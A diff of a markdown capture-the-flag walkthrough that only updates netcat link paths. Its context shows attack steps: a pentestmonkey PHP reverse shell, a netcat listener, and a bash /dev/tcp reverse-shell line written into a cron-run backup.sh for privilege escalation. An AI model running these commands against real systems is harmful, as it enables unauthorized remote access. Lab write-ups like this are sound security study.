@@ -249,7 +249,7 @@ The fact that we can see our duck in the browser means _the webserver is executi
 
 Knowing that this is an Apache server, we can assume that PHP is running the backend. Additionally, we can see that php files are being referenced in the URLs.
 
-PHP _executes on the server_, so whatever PHP is capable of doing, we can leverage to execute a [rev shell](https://github.com/TrshPuppy/obsidian-notes/blob/main/cybersecurity/TTPs/exploitation/rev-shell.md). An easy PHP shell for us to use is [this one](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) from pentest monkey. Copy and paste the code, change the hostname and port values, and make sure [netcat](https://github.com/TrshPuppy/obsidian-notes/blob/main/cybersecurity/tools/netcat.md) is listening on the port.
+PHP _executes on the server_, so whatever PHP is capable of doing, we can leverage to execute a [rev shell](https://github.com/TrshPuppy/obsidian-notes/blob/main/cybersecurity/TTPs/exploitation/rev-shell.md). An easy PHP shell for us to use is [this one](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) from pentest monkey. Copy and paste the code, change the hostname and port values, and make sure [netcat](https://github.com/TrshPuppy/obsidian-notes/blob/main/cybersecurity/tools/exploitation/netcat.md) is listening on the port.
 
 ```bash
 nc -lvnp 44444
@@ -390,7 +390,7 @@ A simple script to achieve a shell using [bash](https://github.com/TrshPuppy/obs
 bash -i >& /dev/tcp/10.0.2.4/44445 0>&1
 ```
 
-Use `nano` to edit `backup.sh`, get rid of the original code and replace it with this shell code. _Before saving the file_ make sure you have another instance of [netcat](https://github.com/TrshPuppy/obsidian-notes/blob/main/cybersecurity/tools/netcat.md) up and listening to the correct port.
+Use `nano` to edit `backup.sh`, get rid of the original code and replace it with this shell code. _Before saving the file_ make sure you have another instance of [netcat](https://github.com/TrshPuppy/obsidian-notes/blob/main/cybersecurity/tools/exploitation/netcat.md) up and listening to the correct port.
 
 Once you save the file, it should get executed w/i the next 2 minutes, and on your listener you should see:
 
